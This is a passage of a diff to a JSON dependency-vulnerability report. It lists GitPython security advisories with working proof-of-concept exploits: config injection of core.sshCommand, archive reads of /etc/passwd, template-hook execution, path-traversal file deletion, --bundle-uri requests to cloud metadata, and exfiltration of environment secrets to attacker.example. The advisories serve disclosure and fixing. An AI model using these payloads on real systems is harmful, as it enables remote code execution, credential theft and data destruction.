repr(benign))\nprint(\"  git core.sshCommand ->\", ctl, \"(unset)\")\nprint(\"exploit name :\", repr(evil))\nprint(\"  written header      ->\", header)\nprint(\"  git core.sshCommand ->\", exp)\n\nassert ctl[0] != 0 and ctl[1] == \"\", \"control unexpectedly set core.sshCommand\"\nassert exp == (0, MARKER), \"not reproduced\"\nprint(f\"VERDICT: attacker-controlled submodule name injected core.sshCommand={MARKER} \"\n      f\"into the victim's trusted .git/config (git would run it on the next ssh op)\")\n```\n\nRun:\n\n```bash\nuv run --with GitPython==3.1.52 python poc.py\n```\n\nObserved output:\n\n```\n# GitPython 3.1.52\ncontrol name : 'docs'\n  git core.sshCommand -> (1, '') (unset)\nexploit name : 'x\"] [core] sshCommand=MARKER_9f3a #'\n  written header      -> [submodule \"x\"] [core] sshCommand=MARKER_9f3a #\"]\n  git core.sshCommand -> (0, 'MARKER_9f3a')\nVERDICT: attacker-controlled submodule name injected core.sshCommand=MARKER_9f3a into the victim's trusted .git/config (git would run it on the next ssh op)\n```\n\nThe benign name yields a single clean `[submodule \"docs\"]` section; the malicious name yields an injected `core.sshCommand`. Deterministic across runs. The payload must use balanced double-quotes (an unbalanced `\"` makes git reject the header); the `submodule \"<name>\"` wrapper balances them automatically.\n\n### Impact\n\nArbitrary attacker-controlled write into the victim's repository-local `.git/config`, which git fully trusts. `core.sshCommand` is executed as the ssh transport command on the victim's next ssh git operation (fetch/pull/push), giving remote code execution; other injectable keys (`alias.*`, `core.pager`, `core.fsmonitor`) fire on more common operations. Reachable in default configuration through two realistic paths:\n\n- an application that constructs a submodule from untrusted input via `Repo.create_submodule(name=...)` (single call); or\n- `Repo.clone_from` of an untrusted repository followed by `submodule_update` — the canonical submodule threat model, where the malicious name is read from the cloned `.gitmodules`.\n\nNo non-default git settings are required. Primarily a Unix vector: on Windows the `\"` in the resulting `.git/modules/<name>` directory name can abort the fresh-clone write branch (the direct config-API and `create_submodule` sinks are unaffected).\n\n### Recommended fix\n\nReject or escape configuration section/subsection/option **names** that contain `]`, `[`, `\"`, or leading/trailing whitespace (or apply git's own section-name escaping) in `_assure_config_name_safe` / `write_section`, rather than only CR/LF/NUL. Validating submodule names before they reach `sm_section` would additionally close the clone-driven path.",
-        "fixedVersion": "3.1.53",
-        "affectedRange": ">=0,<3.1.53",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-07-24T16:22:02Z",
-        "modified": "2026-08-04T05:41:05.585188057Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3rp5-jjmw-4wv2",
-          "https://github.com/gitpython-developers/GitPython/commit/1ed1b924f4e2d2ee7bab296df77b978af21853f1",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.53"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [],
-        "aliases": [
-          "GHSA-539m-9xh6-q6rr"
-        ],
-        "cweIds": [
-          "CWE-73",
-          "CWE-200"
-        ],
-        "severity": "MEDIUM",
-        "cvssScore": 6.5,
-        "summary": "GitPython: Incomplete unsafe_git_archive_options denylist omits --add-file / --add-virtual-file, enabling arbitrary file read via Repo.archive()",
-        "details": "**Target:** gitpython-developers/GitPython\n**Tested:** HEAD `07e80555` (2026-07-25), latest release 3.1.55, `git version 2.50.1`\n\n## Summary\n\n`Repo.archive()` does call the option guard, so this is not a missing-guard report. The guard is present and working; the **denylist it consults is incomplete**.\n\n```python\n# git/repo/base.py:169\nunsafe_git_archive_options = [\n    # Allows arbitrary command execution through the remote git-upload-archive command.\n    \"--exec\",\n    # Writes output to a caller-controlled filesystem path.\n    \"--output\",\n    \"-o\",\n]\n```\n\nThe comment on `--output` states the protected class in the project's own words: an option that lets the caller name **a filesystem path** is unsafe. `--output` is blocked because it *writes* to a caller-chosen path.\n\n`git archive` also accepts `--add-file=<path>` and `--add-virtual-file=<path:content>` (both present in current git; verified against `git version 2.50.1`). `--add-file` *reads* a caller-chosen path — including an absolute path outside the repository — and places the bytes into the archive the caller receives. Neither option is in the list, and no other layer references them:\n\n```\n$ grep -rniE \"add.file|add_file\" git/\ngit/index/base.py:771:   R\"\"\"Add files from the working tree, ...      # unrelated docstring\n```\n\nNet effect: the guard blocks arbitrary file **write** at this sink while permitting arbitrary file **read** at the same sink.\n\n## Reachability proof (verified at the sink)\n\n`poc/poc_addfile.py` at HEAD `07e80555`. The PoC creates its own out-of-tree canary, so it runs from a clean machine:\n\n```\n-- CONTROL: options the denylist covers (expect BLOCKED) --\n  [BLOCKED] output='/tmp/gp_written.tar': --output is not allowed, use `allow_unsafe_options=True` to allow it.\n  [BLOCKED] o='/tmp/gp_written.tar': -o is not allowed, use `allow_unsafe_options=True` to allow it.\n  [BLOCKED] exec='touch /tmp/gp_exec': --exec is not allowed, use `allow_unsafe_options=True` to allow it.\n\n-- SIBLING OMITTED FROM THE DENYLIST: --add-file (expect ALLOWED) --\n  [ALLOWED] add_file='/tmp/gp_canary.txt'  -> archive 10240 bytes\n  archive members: ['f.txt', 'gp_canary.txt']\n  >>> EXFILTRATED gp_canary.txt: 'secret-canary-12345'\n  >>> byte-for-byte match with the out-of-tree file: CONFIRMED\n\n-- also: --add-virtual-file (attacker-chosen name AND content) --\n  [ALLOWED] add_virtual_file='pwn.txt:hello'  -> archive 10240 bytes\n```\n\nThe three blocked lines are the control: they prove the guard is active on this call path, so the fourth result is a gap in list membership rather than a guard that never ran.\n\nMinimal reproduction:\n\n```python\nimport io, tarfile\nfrom git import Repo\n\nbuf = io.BytesIO()\nRepo(\"/path/to/repo\").archive(buf, format=\"tar\", add_file=\"/etc/passwd\")\nprint(tarfile.open(fileobj=io.BytesIO(buf.getvalue())).getnames())\n# ['<repo files>', 'passwd']   <- contents readable by whoever receives the archive\n```\n\nThe canary is untracked and lives outside the repository; its contents are recovered from the returned archive and asserted byte-for-byte against the on-disk file. The option is rendered by `transform_kwargs` into `--add-file=<path>` and reaches `git archive` unmodified.\n\n## Direct precedent\n\n`GHSA-6p8h-3wgx-97gf` (High, published 2026-07-22) is the same defect on the sibling list: *\"Incomplete `unsafe_git_clone_options` denylist omits `--template`\"* — an option absent from one of these denylists, reachable under the same caller-controlled-options precondition, accepted and fixed by adding it. `git log` shows the archive list itself has already been extended reactively once, in `701ce32f` (*fix: Guard unsafe git command options*, GHSA-956x-8gvw-wg5v), and the `--template` omission was then fixed separately in `ffcb5359`.\n\n## `--add-virtual-file` is the same gap pointing the other way\n\n`--add-virtual-file=<path:content>` lets the caller inject **attacker-chosen content under an attacker-chosen name** into an archive that downstream consumers will reasonably treat as repository-derived. \n\n## Suggested remediation\n\n1. **Preferred — allowlist.** `Repo.archive()` has a small legitimate option surface (`format`, `prefix`, `worktree_attributes`, `remote`, compression level, plus paths). Accepting those and rejecting the rest means a future git release cannot add another path-taking option that silently reopens this.\n2. **Minimum — extend the list** with `--add-file` and `--add-virtual-file`, and make the membership rule *\"the option takes a filesystem path or URL\"* rather than *\"the option executes a command\"*. The existing comment on `--output` already implies that rule; applying it consistently is what closes the class instead of this instance.\n\n## Scope limits\n\n- Impact is **arbitrary file read at the privileges of the process**. Not code execution — I make no such claim here.\n- It requires the embedding application to forward caller-influenced kwargs into `Repo.archive()`. That is the identical precondition to `--output`, `--exec` and `--template`, all of which this project has treated as reportable.\n\n## Disclosure\n\nReported privately via GitHub private vulnerability reporting. Happy to test a candidate patch against the PoC. No public disclosure until you have shipped a fix and are ready.\n---\n\n## Addendum (2026-07-25) — related observation on the same membership question, filed here rather than separately\n\nWhile auditing the archive denylist, the same class of gap was identified in unsafe_git_clone_options. A second advisory is not being requested, as the issue is lower severity and should inform the fix for the issue above rather than require separate triage. Recording it here to provide the complete picture in one place.\n\n`Repo._clone()` treats a URL's protocol as a security boundary and applies `check_unsafe_protocols()` to exactly one input:\n\n```python\nclone_url = Git.polish_url(url, expand_vars=False)\nif not allow_unsafe_protocols:\n    Git.check_unsafe_protocols(clone_url)      # the positional url only\n```\n\n`git clone` accepts a **second** URL via `--bundle-uri=<uri>`, which git dereferences before the main transport runs. That option is absent from `unsafe_git_clone_options`, so the option guard passes it, and `check_unsafe_protocols()` never inspects it. A caller-influenced value therefore drives an outbound request from the host:\n\n```python\nRepo.clone_from(trusted_url, dest,\n                multi_options=[\"--bundle-uri=http://169.254.169.254/latest/meta-data/\"])\n# no UnsafeProtocolError, no UnsafeOptionError\n```\n\nConfirmed against a local listener — the request leaves the process:\n\n```\n127.0.0.1 - - [24/Jul/2026 23:07:41] \"GET /internal-metadata HTTP/1.1\" 404 -\n```\n\n`file:///path` is likewise accepted without error. Note this is **not** a tokenisation bypass: `multi_options` is `shlex.split` before the check (per `c9a26789` / GHSA-x2qx-6953-8485), so the fully-split `--bundle-uri=...` token is checked and legitimately passes because the option is not on the list.\n\nWhy it belongs with this report: both are the *membership* question rather than the matching logic — is the set of blocked options complete, and does the protocol guard inspect every URL git will dereference? The structural remediation proposed above covers both if extended slightly: prefer an allowlist per command, and route **every** URL-bearing option through `check_unsafe_protocols()`, not only the positional URL. Adding `--bundle-uri` to `unsafe_git_clone_options` would be the minimal fix.",
-        "fixedVersion": "3.1.57",
-        "affectedRange": ">=0,<3.1.57",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-08-03T20:14:28Z",
-        "modified": "2026-08-03T20:30:18.349529103Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-539m-9xh6-q6rr",
-          "https://github.com/gitpython-developers/GitPython/pull/2193",
-          "https://github.com/gitpython-developers/GitPython/commit/7a4f5dcb7bf3cbcbf6e438017efcdfe0bc0d36ca",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.57"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [],
-        "aliases": [
-          "GHSA-6p8h-3wgx-97gf"
-        ],
-        "cweIds": [
-          "CWE-184",
-          "CWE-78"
-        ],
-        "severity": "HIGH",
-        "cvssScore": 7.5,
-        "summary": "GitPython: Incomplete unsafe_git_clone_options denylist omits --template enabling arbitrary command execution via clone hooks",
-        "details": "## Summary\nGitPython's `unsafe_git_clone_options` denylist omits `--template`. `git clone --template=<dir>` copies `<dir>/hooks/` into the new repository and runs them (`post-checkout` fires during clone), so a caller who can influence clone options can achieve arbitrary command execution in the default `allow_unsafe_options=False` configuration.\n\n## Root Cause\n`base.py:145-152` defines `unsafe_git_clone_options = [\"--upload-pack\",\"-u\",\"--config\",\"-c\"]` — `--template` is absent. The guard candidate `['--template']` passes `check_unsafe_options` (verified). git copies the hook directory and executes `post-checkout` at checkout time. git's `protocol.allow`/`GIT_ALLOW_PROTOCOL` do not gate `--template`; the incomplete denylist is the only defense.\n\n## Impact\nArbitrary OS command execution during clone (default config). Requires an attacker-readable directory containing an executable hook — a genuine second precondition (realistic via shared filesystems, upload dirs, `/tmp`, or attacker-writable network paths), reflected as AC:H.\n\n## Proof of Concept\n```python\n# attacker stages <dir>/hooks/post-checkout (chmod +x)\nfrom git import Repo\nRepo.clone_from(src, dst, template='<dir>')   # post-checkout hook executes -> marker created (verified)\n```\n\n## Attack Chain\n1. Setup: attacker stages `<dir>/hooks/post-checkout` (chmod +x). Guard: n/a (filesystem).\n2. Entry: `Repo.clone_from(url, path, template='<dir>')`. Guard: `check_unsafe_options(candidates=['--template'], unsafe=unsafe_git_clone_options)`. Bypass proof: `--template` not on the denylist -> passes (verified candidate `['--template']`, no error).\n3. Sink: git copies the hook and executes `post-checkout` at checkout. Impact: ACE, default config (verified marker created).\n\n## Bypass Evidence\nLive-verified on HEAD (tag 3.1.53): guard candidate `['--template']` passed with no error; staged `post-checkout` hook executed during `clone_from`, creating the marker. Independent of the value-smuggle bypass (`--template` is a legitimate long option that survives any single-char-value fix). Not covered by any existing advisory.\n\n## Affected Versions\n`<= 3.1.53`\n\n## Suggested Fix\nAdd `--template` (and audit for other hook/exec-influencing options) to `unsafe_git_clone_options`.\n\n---\nReported by **zx (Jace)** — GitHub: @manus-use",
-        "fixedVersion": "3.1.54",
-        "affectedRange": ">=0,<3.1.54",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-07-24T16:42:09Z",
-        "modified": "2026-07-25T21:44:40.055637633Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-6p8h-3wgx-97gf",
-          "https://github.com/gitpython-developers/GitPython/pull/2180",
-          "https://github.com/gitpython-developers/GitPython/commit/ffcb5359e87619f4fe4a70a4aff5f08c5580ba97",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [
-          "CVE-2026-44243"
-        ],
-        "aliases": [
-          "GHSA-7545-fcxq-7j24",
-          "PYSEC-2026-2162"
-        ],
-        "cweIds": [
-          "CWE-22"
-        ],
-        "severity": "HIGH",
-        "cvssScore": 7.1,
-        "summary": "GitPython reference APIs has a path traversal vulnerability that allows arbitrary file write and delete outside the repository",
-        "details": "## 🧾 Summary\n\nA vulnerability in **GitPython** allows **attackers who can supply a crafted reference path to an application using GitPython** to **write, overwrite, move, or delete files outside the repository’s `.git` directory** via **insufficient validation of reference paths in reference creation, rename, and delete operations**.\n\n---\n\n## 📦 Affected Versions\n\n* Affected: `<= 3.1.46` and current `main` (`3.1.47` in local checkout)\n\n---\n\n## 🧠 Details\n\n### Vulnerability Type\n\n**Path Traversal leading to Arbitrary File Write and Arbitrary File Deletion**\n\n---\n\n### Root Cause\n\nReference paths are validated when they are resolved for reading, but are not consistently validated before filesystem write, rename, and delete operations.\n\n`SymbolicReference._check_ref_name_valid()` rejects traversal sequences such as `..`, but `SymbolicReference.create`, `Reference.create`, `SymbolicReference.set_reference`, `SymbolicReference.rename`, and `SymbolicReference.delete` still construct filesystem paths from attacker-controlled ref names without enforcing repository boundaries.\n\n---\n\n### Affected Code\n\n```python\ndef set_reference(self, ref, logmsg=None):\n    ...\n    fpath = self.abspath\n    assure_directory_exists(fpath, is_file=True)\n\n    lfd = LockedFD(fpath)\n    fd = lfd.open(write=True, stream=True)\n    ...\n```\n\n```python\n@classmethod\ndef delete(cls, repo, path):\n    full_ref_path = cls.to_full_path(path)\n    abs_path = os.path.join(repo.common_dir, full_ref_path)\n    if os.path.exists(abs_path):\n        os.remove(abs_path)\n```\n\n```python\ndef rename(self, new_path, force=False):\n    new_path = self.to_full_path(new_path)\n    new_abs_path = os.path.join(_git_dir(self.repo, new_path), new_path)\n    cur_abs_path = os.path.join(_git_dir(self.repo, self.path), self.path)\n    ...\n    os.rename(cur_abs_path, new_abs_path)\n```\n\n---\n\n### Attack Vector\n\n**Local attack through application-controlled input passed into GitPython reference APIs**\n\n### Authentication Required\n\n**None at the library boundary. In practice, exploitation requires the ability to influence ref names supplied by the consuming application.**\n\n---\n\n## 🧪 Proof of Concept\n\n### Setup\n\n```bash\npip install GitPython==3.1.46\npython poc.py\n```\n\n---\n\n### Exploit\n\n```python\nimport shutil\nfrom pathlib import Path\n\nfrom git import Repo\nfrom git.refs.reference import Reference\nfrom git.refs.symbolic import SymbolicReference\n\nbase = Path(\"gp-ghsa-poc\").resolve()\nif base.exists():\n    shutil.rmtree(base)\n\nrepo_dir = base / \"repo\"\nrepo = Repo.init(repo_dir)\n\n(repo_dir / \"a.txt\").write_text(\"init\\n\", encoding=\"utf-8\")\nrepo.index.add([\"a.txt\"])\nrepo.index.commit(\"init\")\n\noutside_write = base / \"outside_write.txt\"\noutside_delete = base / \"outside_delete.txt\"\noutside_delete.write_text(\"DELETE ME\\n\", encoding=\"utf-8\")\n\nprint(f\"repo_dir       = {repo_dir}\")\nprint(f\"outside_write  = {outside_write}\")\nprint(f\"outside_delete = {outside_delete}\")\n\nReference.create(repo, \"../../../outside_write.txt\", \"HEAD\")\n\nprint(\"\\n[+] outside_write exists:\", outside_write.exists())\nif outside_write.exists():\n    print(\"[+] outside_write content:\")\n    print(outside_write.read_text(encoding=\"utf-8\"))\n\nSymbolicReference.delete(repo, \"../../../outside_delete.txt\")\n\nprint(\"\\n[+] outside_delete exists after delete:\", outside_delete.exists())\n```\n\n---\n\n### Result\n\n```text\nrepo_dir       = ...\\gp-ghsa-poc\\repo\noutside_write  = ...\\gp-ghsa-poc\\outside_write.txt\noutside_delete = ...\\gp-ghsa-poc\\outside_delete.txt\n\n[+] outside_write exists: True\n[+] outside_write content:\n<current HEAD commit SHA>\n\n[+] outside_delete exists after delete: False\n```\n\n---\n\n## 💥 Impact\n\n### What can an attacker do?\n\n* Create or overwrite files outside the repository metadata directory\n* Delete attacker-chosen files reachable from the process permissions\n* Corrupt application state or configuration files\n* Cause denial of service by deleting or overwriting important files\n\n---\n\n### Security Impact\n\n* **Confidentiality:** Low\n* **Integrity:** High\n* **Availability:** High\n\n---\n\n### Who is affected?\n\n* Applications that expose GitPython reference operations to user-controlled input\n* Git automation services, repository management backends, CI/CD helpers, and developer platforms\n* Multi-user environments where one user can influence ref names processed on behalf of another workflow\n\n---\n\n## 🛠️ Mitigation / Fix\n\n### Recommended Fix\n\n```python\ndef _validate_ref_write_path(repo, path, *, for_git_dir=False):\n    SymbolicReference._check_ref_name_valid(path)\n\n    base = Path(repo.git_dir if for_git_dir else repo.common_dir).resolve()\n    target = (base / path).resolve()\n\n    if base not in [target, *target.parents]:\n        raise ValueError(f\"Reference path escapes repository boundary: {path}\")\n\n    return str(target)\n```\n\n```python\nfull_ref_path = cls.to_full_path(path)\n_validate_ref_write_path(repo, full_ref_path)\n```",
-        "fixedVersion": "3.1.48",
-        "affectedRange": ">=0,<3.1.48",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-05-06T19:38:48Z",
-        "modified": "2026-07-13T07:26:30.186818349Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-7545-fcxq-7j24",
-          "https://nvd.nist.gov/vuln/detail/CVE-2026-44243",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.48"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [],
-        "aliases": [
-          "GHSA-94p4-4cq8-9g67"
-        ],
-        "cweIds": [
-          "CWE-200",
-          "CWE-214"
-        ],
-        "severity": "HIGH",
-        "cvssScore": 7.5,
-        "summary": "GitPython: Environment-variable exfiltration via Repo.create_remote() / Remote.add() URL (incomplete fix of GHSA-rwj8-pgh3-r573)",
-        "details": "## Summary\n\nThe fix for [GHSA-rwj8-pgh3-r573](https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rwj8-pgh3-r573) stopped `Repo.clone_from()` from running caller-supplied URLs through `os.path.expandvars()`, but it guarded only that one caller. `Remote.create()` — reached from the public `Repo.create_remote()` and its `Remote.add()` alias — still passes an attacker-influenceable URL through `Git.polish_url()` with the default `expand_vars=True`. A URL such as `http://attacker.example/${AWS_SECRET_ACCESS_KEY}/repo.git` is expanded server-side to embed the hosting process's environment secret, written into `.git/config`, and then transmitted to the attacker's host on the next `fetch`/`pull`. This is the same primitive and same \"import repository from URL\" threat model the advisory describes, via the sibling caller the fix missed.\n\n## Root Cause\n\nFix commit [`8ac5a305`](https://github.com/gitpython-developers/GitPython/commit/8ac5a30519b6f4af85398b9b9d7064ff4d452da2) added an `expand_vars` parameter to `Git.polish_url()` (default `True`) and used `expand_vars=False` only in `Repo._clone()` ([`git/repo/base.py:1455`](https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/repo/base.py#L1455)). The shared helper's dangerous default was left in place, and the other callers were not updated.\n\n[`git/remote.py:811`](https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/remote.py#L811), `Remote.create`:\n\n```python\nurl = Git.polish_url(url)                 # expand_vars=True -> os.path.expandvars(url)\nif not allow_unsafe_protocols:\n    Git.check_unsafe_protocols(url)       # https:// carrying the secret passes\nrepo.git.remote(scmd, \"--\", name, url, **kwargs)   # expanded URL written to .git/config\n```\n\n`check_unsafe_protocols()` runs *after* expansion here, so it rejects an `ext::` payload but does nothing about an `https://` URL that carries an expanded secret in its path or host — the disclosure primitive.\n\nThe same unguarded call also sits at [`git/objects/submodule/base.py:611`](https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/objects/submodule/base.py#L611) (`Submodule.add`), which writes the expanded URL into `.gitmodules` (a tracked file) and `.git/config`.\n\n## Steps to Reproduce\n\n### Prerequisites\n\n- Python 3.9+\n- `git` on `PATH` (for the fetch step)\n- GitPython 3.1.53 (installed below)\n\n### Step 1: Install GitPython 3.1.53 in a clean venv\n\n```bash\nmkdir /tmp/gp-remote-poc && cd /tmp/gp-remote-poc\npython3 -m venv venv\n./venv/bin/pip install gitpython==3.1.53\n```\n\n### Step 2: Write the PoC\n\n```bash\ncat > poc.py <<'PYEOF'\n#!/usr/bin/env python3\n\"\"\"Env-var exfiltration via Repo.create_remote() URL. Sentinel data only.\"\"\"\nimport http.server\nimport os\nimport tempfile\nimport threading\n\nimport git\n\nprint(\"gitpython version:\", git.__version__)\n\n# Sentinel standing in for a process secret such as AWS_SECRET_ACCESS_KEY.\nSENTINEL = \"leaked-a1b2c3-SENTINEL-do-not-use\"\nos.environ[\"GP_SENTINEL_SECRET\"] = SENTINEL\n\n# Local HTTP server standing in for attacker.example.\ncaptured = []\n\n\nclass Handler(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        captured.append(self.path)\n        self.send_response(404)\n        self.end_headers()\n\n    def log_message(self, *a):\n        pass\n\n\nsrv = http.server.HTTPServer((\"127.0.0.1\", 0), Handler)\nport = srv.server_address[1]\nthreading.Thread(target=srv.serve_forever, daemon=True).start()\n\n# Attacker-controlled URL handed to an \"import from URL\" feature.\nattacker_url = \"http://127.0.0.1:%d/steal/${GP_SENTINEL_SECRET}/repo.git\" % port\n\n\ndef norm(s):  # display the ephemeral listener port as a stable placeholder\n    return s.replace(\"127.0.0.1:%d\" % port, \"127.0.0.1:PORT\")\n\n\nprint(\"attacker-supplied URL :\", norm(attacker_url))\n\nrepo = git.Repo.init(tempfile.mkdtemp(prefix=\"gp-victim-\"))\nremote = repo.create_remote(\"evil\", attacker_url)   # public API\n\nstored = repo.remote(\"evil\").url\nprint(\"stored remote URL     :\", norm(stored))\nprint(\"SENTINEL in git config:\", SENTINEL in stored)\n\ntry:\n    remote.fetch()          # transmits the expanded URL to the attacker host\nexcept Exception:\n    pass                    # fetch fails after the request is already sent\n\nsrv.shutdown()\nover_network = any(SENTINEL in p for p in captured)\nprint(\"HTTP paths received   :\", [norm(p) for p in captured])\nprint(\"SENTINEL over network :\", over_network)\n\nprint()\nif SENTINEL in stored and over_network:\n    print(\"VULNERABLE: env-var expanded into stored URL AND transmitted to attacker host\")\nelif SENTINEL in stored:\n    print(\"VULNERABLE: env-var expanded into stored git-config URL\")\nelse:\n    print(\"not reproduced\")\nPYEOF\n```\n\n### Step 3: Run it\n\n```bash\ncd /tmp/gp-remote-poc && ./venv/bin/python poc.py\n```\n\nExpected output (the listener's ephemeral port is shown as `PORT`):\n\n```\ngitpython version: 3.1.53\nattacker-supplied URL : http://127.0.0.1:PORT/steal/${GP_SENTINEL_SECRET}/repo.git\nstored remote URL     : http://127.0.0.1:PORT/steal/leaked-a1b2c3-SENTINEL-do-not-use/repo.git\nSENTINEL in git config: True\nHTTP paths received   : ['/steal/leaked-a1b2c3-SENTINEL-do-not-use/repo.git/info/refs?service=git-upload-pack']\nSENTINEL over network : True\n\nVULNERABLE: env-var expanded into stored URL AND transmitted to attacker host\n```\n\nThe `${GP_SENTINEL_SECRET}` token in the supplied URL is replaced with the environment value both in the stored `.git/config` URL and in the request that reaches the attacker-controlled host.\n\n## Suggested Fix\n\nPass `expand_vars=False` at the remaining URL callers, matching the clone fix:\n\n- `git/remote.py` `Remote.create`: `url = Git.polish_url(url, expand_vars=False)`\n- `git/objects/submodule/base.py` `Submodule.add`: `url = Git.polish_url(url, expand_vars=False)`\n\nMore robustly, flip the `Git.polish_url()` default to `expand_vars=False` (env-var expansion on a URL is never desirable for network remotes) and require callers that genuinely normalize local paths to opt in.\n\n## Cleanup\n\n```bash\nrm -rf /tmp/gp-remote-poc\n```\n\n## Impact\n\nAny secret in the hosting process environment (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, CI/CD tokens) is disclosed to an attacker who controls a remote URL passed to `Repo.create_remote()` / `Remote.add()`. The secret is expanded into `.git/config` immediately and transmitted over the network (DNS + HTTP) on the next `fetch`/`pull`/`remote update`. This is the documented \"import repository from URL\" attacker model of GHSA-rwj8-pgh3-r573 — CI servers, git-hosting mirrors, and dependency scanners — applied to the add-a-remote flow, which the clone-only fix did not cover. The same disclosure reaches `.gitmodules` (a committable file) via `Submodule.add()`.",
-        "fixedVersion": "3.1.55",
-        "affectedRange": ">=0,<3.1.55",
-        "isFixAvailable": true,
-        "exploitedInWild": null,
-        "epssScore": null,
-        "published": "2026-07-24T21:45:16Z",
-        "modified": "2026-07-25T21:44:41.451010015Z",
-        "references": [
-          "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-94p4-4cq8-9g67",
-          "https://github.com/gitpython-developers/GitPython/commit/863417457a0633db7ea5aed4fd01e0b291a41162",
-          "https://github.com/gitpython-developers/GitPython",
-          "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.55"
-        ]
-      },
-      {
-        "name": "gitpython",
-        "ecosystem": "PyPI",
-        "version": "3.1.40",
-        "direct": false,
-        "dependencyType": "unknown",
-        "purl": "pkg:pypi/gitpython@3.1.40",
-        "cveIds": [
-          "CVE-2026-67323"
-        ],
-        "aliases": [
-          "GHSA-956x-8gvw-wg5v"
-        ],
-        "cweIds": [
-          "CWE-77",
-          "CWE-88"
-        ],
-        "severity": "HIGH",
-        "cvssScore": 8.4,
-        "summary": "GitPython: command injection via unguarded Git options in `Repo.archive()`, `git.ls_remote()`, and arbitrary file overwrite via `Repo.iter_commits()` / `Repo.blame()`",
-        "details": "## Summary\n\nGitPython spawns the real `git` binary with an argument vector built from caller-supplied values. To prevent argument injection, GitPython maintains denylists of \"unsafe\" Git options (`--upload-pack`, `--receive-pack`, `--exec`, `-c`, `--config`, …) that can be abused to run arbitrary commands, and enforces them with `Git.check_unsafe_options()`.\n\nThat enforcement is only wired into the **network** commands — `clone_from`, `Remote.fetch`, `Remote.pull`, `Remote.push`. Several other public APIs that also forward caller-controlled values into the `git` argv have **no guard at all**:\n\n1. **`Repo.archive(ostream, treeish=None, prefix=None, **kwargs)`** forwards `**kwargs` verbatim into `git archive`. An attacker-influenced options mapping such as `{\"remote\": \".\", \"exec\": \"<cmd>\"}` becomes `git archive --remote=. --exec=<cmd> -- <treeish>`, and `git archive --remote=<local repo>` invokes `git-upload-archive` whose path is overridden by `--exec` → **arbitrary command execution under default Git configuration** (no `protocol.ext.allow` needed).\n\n2. **`repo.git.ls_remote(<url>, upload_pack=\"<cmd>\")`** (and the dynamic-command builder generally) turns the `upload_pack` kwarg into `--upload-pack=<cmd>` with no guard → **arbitrary command execution**.\n\n3. **`Repo.iter_commits(rev)`** and **`Repo.blame(rev, file)`** place the caller's `rev` value into the argv *before* the `--` end-of-options separator and apply no leading-dash check. A benign-looking ref value such as `--output=/path/to/file` is parsed by `git rev-list` / `git blame` as the `--output` option, which **opens and truncates an arbitrary file** before Git even validates the revision → arbitrary file clobber (integrity/availability; can destroy keys, configs, lockfiles, or be aimed at files the host later sources).\n\nThe first two are direct code execution; the third is an arbitrary file-overwrite primitive. All share one root cause: the `check_unsafe_options` / end-of-options discipline that GitPython applies to clone/fetch/pull/push was never extended to these sinks.\n\n## Details\n\nGitPython explicitly recognises these options as command-execution vectors. `git/remote.py:535`:\n\n```python\nunsafe_git_fetch_options = [\n    # Arbitrary command execution.\n    \"--upload-pack\",\n    \"--receive-pack\",\n    # Arbitrary file overwrite.\n    \"--exec\",\n]\n```\n\nand enforces them via `Git.check_unsafe_options()` (`git/cmd.py:963`):\n\n```python\ndef check_unsafe_options(cls, options, unsafe_options):\n    ...\n    if unsafe_option is not None:\n        raise UnsafeOptionError(f\"{unsafe_option} is not allowed, use `allow_unsafe_options=True` to allow it.\")\n```\n\nBut `check_unsafe_options` is invoked from **only five sites**, all network commands:\n\n```\ngit/remote.py:1071   Remote.fetch\ngit/remote.py:1125   Remote.pull\ngit/remote.py:1198   Remote.push\ngit/repo/base.py:1410 / :1412  Repo.clone_from\n```\n\nThe following sinks call `git` with caller-controlled options/positionals and are **not** guarded:\n\n### 1. `Repo.archive` — command execution (`git/repo/base.py:1623`)\n\n```python\ndef archive(self, ostream, treeish=None, prefix=None, **kwargs):\n    ...\n    self.git.archive(\"--\", treeish, *path, **kwargs)\n    return self\n```\n\n`treeish` and `path` are correctly placed after `--`, but `**kwargs` are converted by `Git.transform_kwarg` (`git/cmd.py:1487`) into `--<name>=<value>` flags and inserted **before** the `--` by `_call_process`, with no `check_unsafe_options`. 